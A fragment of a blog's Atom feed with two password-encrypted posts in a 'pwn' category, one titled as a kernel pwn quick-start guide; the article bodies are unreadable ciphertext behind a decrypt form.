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 </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.776Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX1+4hTd9zkiJHhJpYGiR18voIM4E1G2H5aZJg8HCzl9fD9OQoc8Tcm/uCj2i5mWAj5rwhk5JnDBFl7eh83RfXjOg9+C9jvsCa5QJql1ZNHgKFMDRAqAb8NHzOz3vSQmSDPERgwTsb30KIkJ367b0x3FRq6sBj7gzJoNABzq1xLSfRO8GxjD1z7PwqntzAoseDEHDGAbwl6SDKeJjHKgo9JFiE+qb8v3DCMi8kcG0thYWblgxK0INX43Ij8/A7WbQvjYFperZmDxuIax/wkPMvqFA3OBGmeVRk6s7q8uLztYoN3KoRQhMQ144TDDaPwpJzEq98ZnhFHTjuEcvP/0s1IdAKDyqFf4yd9BQ7dZ3H+uqUZu0U/1521nP9fzQa3vmRKxdg74YVP+DesK2L2zzzStMawh9P8RqRwHUhlhNbkkZ75YJupIPEiwtar898/Uy1cg78x3fRidNeeeX4RTHDfHfSMPJSbGn5VVz8/JfFJxRLx2O5GnTXAJlN4E9StbHxYwyLzTdXmcmObk4p81zYnrvYlOWsnaPx2K4zAcK20vbRgBRTznn8TZEgcqs3kG6WTn8uF+owvY7O4YnxDZm/1P/nAQPhnH8glcW67mZ3Plx5LnpcX07PcSf6647bGbyIxEQqUTJxlMJSH0GMFskIJMTM7iYz6RBmz1yS6xX42in3Nq2deEr0JMfxWZZIzj4JFdbMIHtidD/X/Rdd0nR7z+mqs6cmSSgOSThR7soa/RTR7SkKFe2SvCDDum2wz0o9/HnUZdQy34hGqiYA4L7czaesR7FZlo0hiWF0tIzAYVJIjMt1bjErPh2fMiPkxAjHhJ3OZcWcgKnO+ACnnxsy4JaYJnZvKf1qdYW6RmMcHKLH18LuI5QVswDdxVM3NoHV7DpPv7lK4+E2IihX1hpFJi/eNJ6e8lPd+O1a8J5pDD5Wiu5yllJ6QtQhk/cusK1eZf78uAESpCUtHUdk1kkBBSDXUQ3xiK6YIUxlRJETg2gnGZ0rzPXM6TjDx1gT70S5W1lgGcwcLHWwTaabGYcnoXrQwxHA8kH723Gd///8jcPAOIgzPCSqz0PyoFhfW6sgyXOT/ckmboVa215osiBvHh/ILqvg35hL+0zoU3S4e2RPnqs0cIAtY9I5dkRih9qXl5jmp29LcCnAM+aJExZBHZ/Rf+tdhj9oHrZl15vtd8TFnPHMHRkR/T/f9qvirCv1JHrSShrCgf3tFxyVRzy